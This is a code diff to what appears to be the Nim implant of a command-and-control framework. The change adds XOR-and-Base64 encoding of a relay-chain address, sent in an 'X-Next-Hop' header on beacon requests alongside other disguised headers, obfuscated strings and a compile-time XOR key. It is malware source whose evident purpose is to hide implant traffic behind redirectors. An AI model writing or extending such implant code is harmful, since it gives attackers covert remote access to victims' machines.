@@ -22,6 +22,13 @@ proc debugKeyDecoding(keyStr: string, keyBytes: string, xorKey: int): void =
             echo obf("  [") & $i & obf("]: 0x") & keyBytes[i].byte.toHex()
         echo obf("DEBUG: Attempting XOR with INITIAL_XOR_KEY: ") & $xorKey
 
+# Encrypt next hop for X-Next-Hop header (XOR + Base64)
+proc encryptNextHop(nextHop: string): string =
+    let xored = xorString(nextHop, $INITIAL_XOR_KEY)
+    result = base64.encode(xored)
+    when defined verbose:
+        echo obf("DEBUG: Encrypted next hop: ") & nextHop & obf(" -> ") & result
+
 # Define the object with listener properties
 const INITIAL_XOR_KEY {.intdefine.}: int = 459457925
 
@@ -130,6 +137,14 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                             Header(key: "Content-Type", value: "application/json")
                         ]
                 
+                # Add X-Next-Hop header if relay chain is configured
+                const RELAY_CHAIN {.strdefine.}: string = ""
+                when RELAY_CHAIN != "":
+                    let encryptedNextHop = encryptNextHop(RELAY_CHAIN)
+                    headers.add(Header(key: "X-Next-Hop", value: encryptedNextHop))
+                    when defined verbose:
+                        echo obf("DEBUG: Added X-Next-Hop header for relay chain: ") & RELAY_CHAIN
+                
                 # Add workspace_uuid header if provided
                 if workspace_uuid != "":
                     headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
@@ -175,6 +190,14 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                         Header(key: "Content-Type", value: "application/json"),
                         Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey)
                     ]
+                
+                # Add X-Next-Hop header if relay chain is configured
+                const RELAY_CHAIN {.strdefine.}: string = ""
+                when RELAY_CHAIN != "":
+                    let encryptedNextHop = encryptNextHop(RELAY_CHAIN)
+                    headers.add(Header(key: "X-Next-Hop", value: encryptedNextHop))
+                    when defined verbose:
+                        echo obf("DEBUG: Added X-Next-Hop header for relay chain (POST): ") & RELAY_CHAIN
                 
                 # Add workspace_uuid header if provided
                 if workspace_uuid != "":
